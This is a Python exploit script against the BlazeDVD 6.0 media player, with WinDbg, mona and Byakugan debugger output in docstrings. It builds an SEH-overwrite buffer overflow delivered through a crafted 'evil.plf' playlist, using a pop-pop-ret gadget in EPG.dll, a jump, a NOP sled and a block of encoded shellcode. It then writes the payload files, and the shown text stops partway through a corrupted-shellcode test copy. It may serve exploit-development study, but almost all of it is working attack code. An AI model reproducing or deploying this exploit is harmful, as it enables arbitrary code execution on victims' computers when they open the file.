import struct

"""
[+] Command used:
!py mona.py pattern_create 10000
Creating cyclic pattern of 10000 bytes

(3114.4d48): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=31644230 edx=77d18a40 esi=00000000 edi=00000000
eip=31644230 esp=0019eaa0 ebp=0019eac0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
31644230 ??              ???
0:000> !pattern_offset 10000
[Byakugan] Control of ecx at offset 872.
[Byakugan] Control of eip at offset 872.
0:000> !py mona pattern_offset 10000 1dB0
Hold on...
[+] Command used:
!py mona.py pattern_offset 10000 1dB0

[+] This mona.py action took 0:00:00.221000
0:000> !py mona pattern_offset 1dB0 10000
Hold on...
[+] Command used:
!py mona.py pattern_offset 1dB0 10000
Looking for 1dB0 in pattern of 500000 bytes
 - Pattern 0Bd1 (1dB0 reversed) found in cyclic pattern at position 872
Looking for 1dB0 in pattern of 500000 bytes
 - Pattern 0Bd1 not found in cyclic pattern (uppercase) 
Looking for 1dB0 in pattern of 500000 bytes
 - Pattern 0Bd1 not found in cyclic pattern (lowercase) 

[+] This mona.py action took 0:00:00.263000

Repeat and generaye another pattern string of 872 length. Realise that the offset is actually at 612
"""

"""
padding = "A" * (612 - 4)
nseh = "C" * 4
seh = "B" * 4
shellcode = padding + nseh + seh

(24c8.3178): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=767b52c0 ecx=0358ba50 edx=00000042 esi=030b1730 edi=6405569c
eip=41414141 esp=0019f348 ebp=030b1980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210212
41414141 ??              ???
0:000> g
(24c8.3178): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=42424242 edx=77d18a40 esi=00000000 edi=00000000
eip=42424242 esp=0019ed18 ebp=0019ed38 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
42424242 ??              ???
0:000> !exchain
0019ed2c: ntdll!ExecuteHandler2+44 (77d18a40)
0019f490: 42424242
Invalid exception stack at 43434343
"""

"""
0:000> !load byakugan
[Byakugan] Successfully loaded!
0:000> !jutsu searchOpcode pop esi | pop ebx | ret
[J] Searching for:
> pop esi 
>  pop ebx 
>  ret
[J] Machine Code:
> 5e 5b c3 
[J] Executable opcode sequence found at: 0x02ec159d
[J] Executable opcode sequence found at: 0x02ec15b3
[J] Executable opcode sequence found at: 0x02ec15cf
[J] Executable opcode sequence found at: 0x02ec15ef
"""

"""
0:004> !py mona modules
Hold on...
[+] Command used:
!py mona.py modules

---------- Mona command started on 2022-08-20 15:20:37 (v2.0, rev 616) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76670000 | 0x766eb000 | 0x0007b000 | True   | False   | True  |  True    | True   | 10.0.19041.789 [msvcp_win.dll] (C:\WINDOWS\SysWOW64\msvcp_win.dll)
 0x65cb0000 | 0x65cea000 | 0x0003a000 | True   | False   | True  |  True    | True   | 10.0.19041.1 [wdmaud.drv] (C:\WINDOWS\SysWOW64\wdmaud.drv)
 0x03700000 | 0x0372a000 | 0x0002a000 | True   | False   | False |  False   | False  | -1.0- [BlazeDVDCtrl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\BlazeDVDCtrl.dll)
 0x03fe0000 | 0x04078000 | 0x00098000 | True   | False   | False |  False   | False  | -1.0- [EqualizerProcess.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\EqualizerProcess.dll)
 0x6fe00000 | 0x6fe2c000 | 0x0002c000 | True   | False   | True  |  True    | True   | 10.0.19041.746 [oledlg.dll] (C:\WINDOWS\SysWOW64\oledlg.dll)
 0x03110000 | 0x0315d000 | 0x0004d000 | True   | False   | False |  False   | False  | 1.0.0.1 [RecorderCtrl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\RecorderCtrl.dll)
 0x65900000 | 0x659c2000 | 0x000c2000 | True   | False   | True  |  True    | True   | 7.0.19041.1741 [PROPSYS.dll] (C:\Windows\SysWOW64\PROPSYS.dll)
 0x02ef0000 | 0x02f19000 | 0x00029000 | True   | False   | False |  False   | False  | 1.0.0.1 [PowerManagementCtrl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\PowerManagementCtrl.dll)
 0x77a90000 | 0x77b73000 | 0x000e3000 | True   | False   | True  |  True    | True   | 10.0.19041.1202 [ole32.dll] (C:\WINDOWS\SysWOW64\ole32.dll)
 0x65b40000 | 0x65b48000 | 0x00008000 | True   | False   | True  |  True    | True   | 10.0.19041.488 [midimap.dll] (C:\WINDOWS\SysWOW64\midimap.dll)
 0x76e30000 | 0x773e6000 | 0x005b6000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [SHELL32.dll] (C:\WINDOWS\SysWOW64\SHELL32.dll)
 0x64150000 | 0x642df000 | 0x0018f000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [twinapi.appcore.dll] (C:\WINDOWS\SysWOW64\twinapi.appcore.dll)
 0x74c10000 | 0x74c42000 | 0x00032000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [iphlpapi.dll] (C:\WINDOWS\SysWOW64\iphlpapi.dll)
 0x65cf0000 | 0x65d5b000 | 0x0006b000 | True   | False   | True  |  True    | True   | 10.0.19041.1503 [MMDevAPI.DLL] (C:\WINDOWS\SysWOW64\MMDevAPI.DLL)
 0x70920000 | 0x70948000 | 0x00028000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [winmm.dll] (C:\WINDOWS\SysWOW64\winmm.dll)
 0x74a00000 | 0x74a47000 | 0x00047000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [WINSTA.dll] (C:\WINDOWS\SysWOW64\WINSTA.dll)
 0x65b20000 | 0x65b36000 | 0x00016000 | True   | False   | True  |  True    | True   | 10.0.19041.1 [asycfilt.dll] (C:\WINDOWS\SysWOW64\asycfilt.dll)
 0x77c90000 | 0x77e34000 | 0x001a4000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [ntdll.dll] (ntdll.dll)
 0x75c40000 | 0x75cb6000 | 0x00076000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [sechost.dll] (C:\WINDOWS\SysWOW64\sechost.dll)
 0x75e60000 | 0x75ebe000 | 0x0005e000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [coml2.dll] (C:\WINDOWS\SysWOW64\coml2.dll)
 0x02fa0000 | 0x02fb4000 | 0x00014000 | True   | False   | False |  False   | False  | 1.6.20.2006 [ProfileStore.DLL] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\ProfileStore.DLL)
 0x5f6c0000 | 0x5f779000 | 0x000b9000 | True   | False   | True  |  True    | True   | 10.0.19041.1741 [TextInputFramework.dll] (C:\Windows\SysWOW64\TextInputFramework.dll)
 0x02ff0000 | 0x0301a000 | 0x0002a000 | True   | False   | False |  False   | False  | 1.0.0.1 [AudioProcess.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\AudioProcess.dll)
 0x76280000 | 0x7632f000 | 0x000af000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [comdlg32.dll] (C:\WINDOWS\SysWOW64\comdlg32.dll)
 0x75440000 | 0x75467000 | 0x00027000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [Wldp.dll] (C:\WINDOWS\SysWOW64\Wldp.dll)
 0x70290000 | 0x70304000 | 0x00074000 | True   | False   | True  |  True    | True   | 10.0.19041.1620 [uxtheme.dll] (C:\WINDOWS\SysWOW64\uxtheme.dll)
 0x6f2d0000 | 0x6f343000 | 0x00073000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [winspool.drv] (C:\WINDOWS\SysWOW64\winspool.drv)
 0x75420000 | 0x75438000 | 0x00018000 | True   | False   | True  |  True    | True   | 10.0.19041.844 [profapi.dll] (C:\WINDOWS\SysWOW64\profapi.dll)
 0x74740000 | 0x74756000 | 0x00016000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [dhcpcsvc.DLL] (C:\WINDOWS\SysWOW64\dhcpcsvc.DLL)
 0x75b60000 | 0x75be7000 | 0x00087000 | True   | False   | True  |  True    | True   | 10.0.19041.1645 [shcore.dll] (C:\WINDOWS\SysWOW64\shcore.dll)
 0x70a00000 | 0x70c10000 | 0x00210000 | True   | False   | True  |  True    | True   | 6.10.19041.1110 [COMCTL32.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_a8625c1886757984\COMCTL32.dll)
 0x02f80000 | 0x02f96000 | 0x00016000 | True   | False   | False |  False   | False  | -1.0- [DibLibDll.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\DibLibDll.dll)
 0x02f50000 | 0x02f80000 | 0x00030000 | True   | False   | False |  False   | False  | 1.0.0.1 [VideoWindow.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\VideoWindow.dll)
 0x773f0000 | 0x774c4000 | 0x000d4000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [MSCTF.dll] (C:\WINDOWS\SysWOW64\MSCTF.dll)
 0x76ca0000 | 0x76cff000 | 0x0005f000 | True   | False   | True  |  True    | True   | 10.0.19041.1415 [bcryptPrimitives.dll] (C:\WINDOWS\SysWOW64\bcryptPrimitives.dll)
 0x10000000 | 0x10018000 | 0x00018000 | False  | False   | False |  False   | False  | -1.0- [skinscrollbar.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\skinscrollbar.dll)
 0x76da0000 | 0x76dc3000 | 0x00023000 | True   | True    | True  |  True    | True   | 10.0.19041.1620 [GDI32.dll] (C:\WINDOWS\SysWOW64\GDI32.dll)
 0x659d0000 | 0x65a6b000 | 0x0009b000 | True   | True    | True  |  True    | True   | 10.0.19041.867 [CoreMessaging.dll] (C:\Windows\SysWOW64\CoreMessaging.dll)
 0x60300000 | 0x60377000 | 0x00077000 | False  | False   | False |  False   | False  | 1.2.5.2007 [Configuration.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\Configuration.dll)
 0x75cc0000 | 0x75e5c000 | 0x0019c000 | True   | False   | True  |  True    | True   | 10.0.19041.1889 [user32.dll] (C:\WINDOWS\SysWOW64\user32.dll)
 0x75c20000 | 0x75c38000 | 0x00018000 | True   | True    | True  |  True    | True   | 10.0.19041.1889 [win32u.dll] (C:\WINDOWS\SysWOW64\win32u.dll)
 0x6fdf0000 | 0x6fdf8000 | 0x00008000 | True   | True    | True  |  True    | True   | 10.0.19041.546 [AVRT.dll] (C:\WINDOWS\SysWOW64\AVRT.dll)
 0x03730000 | 0x03769000 | 0x00039000 | True   | False   | False |  False   | False  | -1.0- [RMACtrl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\RMACtrl.dll)
 0x61600000 | 0x6169b000 | 0x0009b000 | False  | False   | False |  False   | False  | 1.12.21.2006 [EPG.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\EPG.dll)
 0x00400000 | 0x005c8000 | 0x001c8000 | False  | False   | False |  False   | False  | 6.0.0.0 [BlazeDVD.exe] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\BlazeDVD.exe)
 0x76420000 | 0x764fc000 | 0x000dc000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [gdi32full.dll] (C:\WINDOWS\SysWOW64\gdi32full.dll)
 0x77bc0000 | 0x77c7f000 | 0x000bf000 | True   | False   | True  |  True    | True   | 7.0.19041.546 [msvcrt.dll] (C:\WINDOWS\SysWOW64\msvcrt.dll)
 0x66270000 | 0x662e3000 | 0x00073000 | True   | False   | True  |  True    | True   | -1.0- [WindowManagementAPI.dll] (C:\Windows\SysWOW64\WindowManagementAPI.dll)
 0x767a0000 | 0x767e5000 | 0x00045000 | True   | False   | True  |  True    | True   | 10.0.19041.1706 [shlwapi.dll] (C:\WINDOWS\SysWOW64\shlwapi.dll)
 0x70550000 | 0x70556000 | 0x00006000 | True   | True    | True  |  True    | True   | 10.0.19041.1466 [msimg32.dll] (C:\WINDOWS\SysWOW64\msimg32.dll)
 0x662f0000 | 0x663e3000 | 0x000f3000 | True   | False   | True  |  True    | True   | 10.0.19041.746 [Windows.UI.dll] (C:\Windows\SysWOW64\Windows.UI.dll)
 0x64000000 | 0x6407a000 | 0x0007a000 | False  | False   | False |  False   | False  | 2.0.0.2 [MediaPlayerCtrl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\MediaPlayerCtrl.dll)
 0x76c80000 | 0x76c99000 | 0x00019000 | True   | False   | True  |  True    | True   | 10.0.19041.1023 [bcrypt.dll] (C:\WINDOWS\SysWOW64\bcrypt.dll)
 0x65820000 | 0x658fb000 | 0x000db000 | True   | False   | True  |  True    | True   | 10.0.19041.1682 [wintypes.dll] (C:\WINDOWS\SysWOW64\wintypes.dll)
 0x64100000 | 0x6412b000 | 0x0002b000 | False  | False   | False |  False   | False  | 1.12.11.2006 [NetReg.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\NetReg.dll)
 0x6e6d0000 | 0x6e6da000 | 0x0000a000 | True   | False   | True  |  True    | True   | 10.0.19041.488 [msacm32.drv] (C:\WINDOWS\SysWOW64\msacm32.drv)
 0x67000000 | 0x67010000 | 0x00010000 | False  | False   | False |  False   | False  | 1.3.22.1332 [VersionInfo.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\VersionInfo.dll)
 0x753e0000 | 0x753ef000 | 0x0000f000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [kernel.appcore.dll] (C:\WINDOWS\SysWOW64\kernel.appcore.dll)
 0x60540000 | 0x60559000 | 0x00019000 | True   | False   | True  |  True    | True   | 10.0.19041.84 [olepro32.dll] (C:\WINDOWS\SysWOW64\olepro32.dll)
 0x65ee0000 | 0x6607a000 | 0x0019a000 | True   | False   | True  |  True    | True   | 10.0.19041.746 [quartz.dll] (C:\WINDOWS\SysWOW64\quartz.dll)
 0x709f0000 | 0x709f8000 | 0x00008000 | True   | False   | True  |  True    | True   | 10.0.19041.1 [wsock32.dll] (C:\WINDOWS\SysWOW64\wsock32.dll)
 0x76200000 | 0x7627e000 | 0x0007e000 | True   | False   | True  |  True    | True   | 2001.12.10941.16384 [clbcatq.dll] (C:\WINDOWS\SysWOW64\clbcatq.dll)
 0x6e6d0000 | 0x6e6da000 | 0x0000a000 | True   | False   | True  |  True    | True   | 10.0.19041.488 [MSACM32.dll] (C:\WINDOWS\SysWOW64\msacm32.drv)
 0x02f30000 | 0x02f44000 | 0x00014000 | True   | False   | False |  False   | False  | -1.0- [RealMediaControl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\RealMediaControl.dll)
 0x768c0000 | 0x768c7000 | 0x00007000 | True   | True    | True  |  True    | True   | 10.0.19041.610 [NSI.dll] (C:\WINDOWS\SysWOW64\NSI.dll)
 0x768d0000 | 0x76ae9000 | 0x00219000 | True   | False   | True  |  True    | True   | 10.0.19041.1889 [KERNELBASE.dll] (C:\WINDOWS\SysWOW64\KERNELBASE.dll)
 0x03020000 | 0x030ac000 | 0x0008c000 | True   | False   | False |  False   | False  | 2.0.10.111 [FileConverter.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\FileConverter.dll)
 0x5fd80000 | 0x5fdc4000 | 0x00044000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [powrprof.dll] (C:\WINDOWS\SysWOW64\powrprof.dll)
 0x77910000 | 0x7798b000 | 0x0007b000 | True   | False   | True  |  True    | True   | 10.0.19041.1682 [ADVAPI32.dll] (C:\WINDOWS\SysWOW64\ADVAPI32.dll)
 0x767f0000 | 0x76853000 | 0x00063000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [WS2_32.dll] (C:\WINDOWS\SysWOW64\WS2_32.dll)
 0x703e0000 | 0x70547000 | 0x00167000 | True   | False   | True  |  True    | True   | 10.0.19041.1706 [gdiplus.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.1706_none_d94bc52be10975a7\gdiplus.dll)
 0x655a0000 | 0x6581e000 | 0x0027e000 | True   | True    | True  |  True    | True   | 10.0.19041.546 [CoreUIComponents.dll] (C:\Windows\SysWOW64\CoreUIComponents.dll)
 0x65b70000 | 0x65ca6000 | 0x00136000 | True   | False   | True  |  True    | True   | 10.0.19041.1741 [AUDIOSES.DLL] (C:\WINDOWS\SysWOW64\AUDIOSES.DLL)
 0x02f20000 | 0x02f30000 | 0x00010000 | True   | False   | False |  False   | False  | -1.0- [QTMediaControl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\QTMediaControl.dll)
 0x75bf0000 | 0x75c15000 | 0x00025000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [imm32.dll] (C:\WINDOWS\SysWOW64\imm32.dll)
 0x048f0000 | 0x04987000 | 0x00097000 | True   | False   | False |  False   | False  | -1.0- [DSPAmplifyProcess.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\DSPAmplifyProcess.dll)
 0x753f0000 | 0x75419000 | 0x00029000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [ntmarta.dll] (C:\WINDOWS\SysWOW64\ntmarta.dll)
 0x6fe40000 | 0x6fe47000 | 0x00007000 | True   | False   | True  |  True    | True   | 10.0.19041.1 [ksuser.dll] (C:\WINDOWS\SysWOW64\ksuser.dll)
 0x77b80000 | 0x77bbb000 | 0x0003b000 | True   | False   | True  |  True    | True   | 10.0.19041.1620 [cfgmgr32.dll] (C:\WINDOWS\SysWOW64\cfgmgr32.dll)
 0x76330000 | 0x76420000 | 0x000f0000 | True   | False   | True  |  True    | True   | 10.0.19041.1889 [KERNEL32.DLL] (C:\WINDOWS\SysWOW64\KERNEL32.DLL)
 0x72700000 | 0x72724000 | 0x00024000 | True   | False   | True  |  True    | True   | 10.0.19041.1620 [DEVOBJ.dll] (C:\WINDOWS\SysWOW64\DEVOBJ.dll)
 0x66180000 | 0x6626d000 | 0x000ed000 | True   | False   | True  |  True    | True   | 10.0.19041.1741 [InputHost.dll] (C:\Windows\SysWOW64\InputHost.dll)
 0x75470000 | 0x75a7c000 | 0x0060c000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [windows.storage.dll] (C:\WINDOWS\SysWOW64\windows.storage.dll)
 0x75ab0000 | 0x75ab8000 | 0x00008000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [version.dll] (C:\WINDOWS\SysWOW64\version.dll)
 0x711e0000 | 0x71634000 | 0x00454000 | True   | False   | True  |  True    | True   | 11.0.19041.1566 [wininet.dll] (C:\WINDOWS\SysWOW64\wininet.dll)
 0x766f0000 | 0x76786000 | 0x00096000 | True   | False   | True  |  True    | True   | 10.0.19041.985 [OLEAUT32.dll] (C:\WINDOWS\SysWOW64\OLEAUT32.dll)
 0x75ec0000 | 0x7613f000 | 0x0027f000 | True   | False   | True  |  True    | True   | 10.0.19041.1741 [combase.dll] (C:\WINDOWS\SysWOW64\combase.dll)
 0x76140000 | 0x761fe000 | 0x000be000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [RPCRT4.dll] (C:\WINDOWS\SysWOW64\RPCRT4.dll)
 0x02ec0000 | 0x02eec000 | 0x0002c000 | True   | False   | False |  False   | False  | 2.0.0.1 [FileAssocator.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\FileAssocator.dll)
 0x70310000 | 0x7031d000 | 0x0000d000 | True   | False   | True  |  True    | True   | -1.0- [UMPDC.dll] (C:\WINDOWS\SysWOW64\UMPDC.dll)
 0x76550000 | 0x76670000 | 0x00120000 | True   | True    | True  |  True    | True   | 10.0.19041.789 [ucrtbase.dll] (C:\WINDOWS\SysWOW64\ucrtbase.dll)
 0x042e0000 | 0x04378000 | 0x00098000 | True   | False   | False |  False   | False  | -1.0- [EchoDelayProcess.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\EchoDelayProcess.dll)
 0x036b0000 | 0x036cb000 | 0x0001b000 | True   | False   | False |  False   | False  | 1.1.6.72 [mlutil.dll] (C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\mlutil.dll)
 0x65d60000 | 0x65d7d000 | 0x0001d000 | True   | False   | True  |  True    | True   | 10.0.19041.1 [winmmbase.dll] (C:\WINDOWS\SysWOW64\winmmbase.dll)
-----------------------------------------------------------------------------------------------------------------------------------------
"""

"""
0:004> u 0x6161cb25
*** WARNING: Unable to verify checksum for C:\Program Files (x86)\BlazeVideo\BlazeDVD 6.0\EPG.dll
EPG!Ordinal1+0x16ce5:
6161cb25 5e              pop     esi
6161cb26 5b              pop     ebx
6161cb27 c3              ret
6161cb28 90              nop
6161cb29 90              nop
6161cb2a 90              nop
6161cb2b 90              nop
6161cb2c 90              nop
"""

"""
padding = "A" * (612 - 4)
nseh = "\xcc\xcc\xcc\xcc";  
seh = struct.pack("I", 0x6161cb25) # EPG.dll 
shellcode = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
payload = padding + nseh + seh + shellcode

(4674.5268): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=767b52c0 ecx=0323ba50 edx=00000042 esi=03111730 edi=6405569c
eip=41414141 esp=0019f328 ebp=03111980 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210216
41414141 ??              ???
0:000> g
(4674.5268): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=0019edf8 ecx=6161cb25 edx=77d18a40 esi=77d18a22 edi=00000000
eip=0019f470 esp=0019ed04 ebp=0019ed18 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
0019f470 cc              int     3
0:000> d eip
0019f470  cc cc cc cc 25 cb 61 61-41 42 43 44 45 46 47 48  ....%.aaABCDEFGH
0019f480  49 4a 4b 4c 4d 4e 4f 50-51 52 53 54 55 56 57 58  IJKLMNOPQRSTUVWX
0019f490  59 5a 41 42 43 44 45 46-47 48 49 4a 4b 4c 4d 4e  YZABCDEFGHIJKLMN
0019f4a0  4f 50 51 52 53 54 55 56-57 58 59 5a 00 53 61 6c  OPQRSTUVWXYZ.Sal
0019f4b0  65 73 32 5c 44 65 73 6b-74 6f 70 5c 65 76 69 6c  es2\Desktop\evil
0019f4c0  2e 70 6c 66 00 00 00 00-00 00 00 00 00 00 00 00  .plf............
0019f4d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0019f4e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
"""

padding = "A" * (612 - 4)
nseh = "\xeb\x1e\x90\x90";  # jump 30 bytes
seh = struct.pack("I", 0x6161cb25) # EPG.dll 
nops = "\x90" * 30;
# shellcode = "\xcc" * 200
shellcode =  ""
shellcode += "\xd9\xc7\xd9\x74\x24\xf4\x5a\x33\xc9\xb8\x0b\x94"
shellcode += "\xbc\xea\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x49"
shellcode += "\x87\x5e\x1f\xb1\x4f\x1c\xe0\x49\x90\x41\x68\xac"
shellcode += "\xa1\x41\x0e\xa5\x92\x71\x44\xeb\x1e\xf9\x08\x1f"
shellcode += "\x94\x8f\x84\x10\x1d\x25\xf3\x1f\x9e\x16\xc7\x3e"
shellcode += "\x1c\x65\x14\xe0\x1d\xa6\x69\xe1\x5a\xdb\x80\xb3"
shellcode += "\x33\x97\x37\x23\x37\xed\x8b\xc8\x0b\xe3\x8b\x2d"
shellcode += "\xdb\x02\xbd\xe0\x57\x5d\x1d\x03\xbb\xd5\x14\x1b"
shellcode += "\xd8\xd0\xef\x90\x2a\xae\xf1\x70\x63\x4f\x5d\xbd"
shellcode += "\x4b\xa2\x9f\xfa\x6c\x5d\xea\xf2\x8e\xe0\xed\xc1"
shellcode += "\xed\x3e\x7b\xd1\x56\xb4\xdb\x3d\x66\x19\xbd\xb6"
shellcode += "\x64\xd6\xc9\x90\x68\xe9\x1e\xab\x95\x62\xa1\x7b"
shellcode += "\x1c\x30\x86\x5f\x44\xe2\xa7\xc6\x20\x45\xd7\x18"
shellcode += "\x8b\x3a\x7d\x53\x26\x2e\x0c\x3e\x2f\x83\x3d\xc0"
shellcode += "\xaf\x8b\x36\xb3\x9d\x14\xed\x5b\xae\xdd\x2b\x9c"
shellcode += "\xd1\xf7\x8c\x32\x2c\xf8\xec\x1b\xeb\xac\xbc\x33"
shellcode += "\xda\xcc\x56\xc3\xe3\x18\xf8\x93\x4b\xf3\xb9\x43"
shellcode += "\x2c\xa3\x51\x89\xa3\x9c\x42\xb2\x69\xb5\xe9\x49"
shellcode += "\xfa\xc5\xed\x51\xfb\x51\xec\x51\xfb\x29\x79\xb7"
shellcode += "\x91\x39\x2c\x60\x0e\xa3\x75\xfa\xaf\x2c\xa0\x87"
shellcode += "\xf0\xa7\x47\x78\xbe\x4f\x2d\x6a\x57\xa0\x78\xd0"
shellcode += "\xfe\xbf\x56\x7c\x9c\x52\x3d\x7c\xeb\x4e\xea\x2b"
shellcode += "\xbc\xa1\xe3\xb9\x50\x9b\x5d\xdf\xa8\x7d\xa5\x5b"
shellcode += "\x77\xbe\x28\x62\xfa\xfa\x0e\x74\xc2\x03\x0b\x20"
shellcode += "\x9a\x55\xc5\x9e\x5c\x0c\xa7\x48\x37\xe3\x61\x1c"
shellcode += "\xce\xcf\xb1\x5a\xcf\x05\x44\x82\x7e\xf0\x11\xbd"
shellcode += "\x4f\x94\x95\xc6\xad\x04\x59\x1d\x76\x34\x10\x3f"
shellcode += "\xdf\xdd\xfd\xaa\x5d\x80\xfd\x01\xa1\xbd\x7d\xa3"
shellcode += "\x5a\x3a\x9d\xc6\x5f\x06\x19\x3b\x12\x17\xcc\x3b"
shellcode += "\x81\x18\xc5"
payload = padding + nseh + seh + nops + shellcode
print("Length of shellcode: {}".format(len(shellcode)))
f = open("evil.plf", "w")
f.write(payload)
f.close

"""
Byakugan : identBuf/listBuf/rmBuf and hunt
"""

pattern_padding_608 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au"
nseh = "\xcc\xcc\xcc\xcc" # memdef
payload = pattern_padding_608 + nseh + seh + nops + shellcode
f = open("pattern_evil.plf", "w")
f.write(payload)

f.close
f = open("pattern_evil_shellcode.txt", "w")
f.write(shellcode)
f.close

"""
!jutsu memDiff file $(OBTAIN FROM length of shellcode) c:\path\to\shellcode.txt $(OBTAIN FROM d eip)
file : indicates that memDiff needs to read from a file
302 : length of memory to read (302 = length of our shellcode)
c:\sploits\blazevideo\shellcode.txt : file containing our original shellcode
0x0012f5de : start address (start point of our shellcode in memory)
"""

f = open("shellcode.txt", "w")
f.write(shellcode)
f.close

f = open("corrupted-shellcode.txt", "w")
shellcode =  ""
shellcode += "\x41\xc7\xd9\x74\x24\xf4\x5a\x33\xc9\xb8\x0b\x94" # change \xd9 to \x41
shellcode += "\xbc\xea\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x49"
shellcode += "\x87\x5e\x1f\xb1\x4f\x1c\xe0\x49\x90\x41\x68\xac"
shellcode += "\xa1\x41\x0e\xa5\x92\x71\x44\xeb\x1e\xf9\x08\x1f"
shellcode += "\x94\x8f\x84\x10\x1d\x25\xf3\x1f\x9e\x16\xc7\x3e"
shellcode += "\x1c\x65\x14\xe0\x1d\xa6\x69\xe1\x5a\xdb\x80\xb3"
shellcode += "\x33\x97\x37\x23\x37\xed\x8b\xc8\x0b\xe3\x8b\x2d"
